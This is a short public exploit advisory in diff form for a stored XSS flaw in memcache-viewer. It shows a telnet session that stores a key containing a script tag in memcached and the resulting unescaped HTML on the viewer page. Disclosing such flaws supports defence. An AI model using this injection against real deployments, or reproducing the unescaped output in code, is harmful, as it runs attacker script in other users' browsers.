@@ -1,0 +1,30 @@
+# Exploit Title: memcache-viewer - Stored XSS
+# Date: 2017-02-24
+# Exploit Author: HaHwul
+# Exploit Author Blog: www.hahwul.com
+# Vendor Homepage: https://github.com/chrisjameskirkham/memcache-viewer
+# Software Link: https://github.com/chrisjameskirkham/memcache-viewer/archive/master.zip
+# Version: Latest commit
+# Tested on: Debian [wheezy]
+
+### Vulnerability 
+This program does not filter filtering on the special character when expressing the data from memcached on the web.
+When XSS attacks and HTML code are inserted in the memcached, user who accesses the page will run the XSS code.
+
+### Example Attack code
+1. Send Payload(XSS Code) after Connecting to memcached server.
+#> telnet 127.0.0.1 11211
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+
+add hacked<script>alert(45)</script> 0 900 2
+45
+STORED
+
+2. Insert data through memcached related 3rd party application.
+
+### Result
+Access index.php after memcache-viewer login
+DOM Area in index.php
+<td class="key">hacked<script>alert(45)</script></td><td class="slab">2</td><td class="size">2</td>
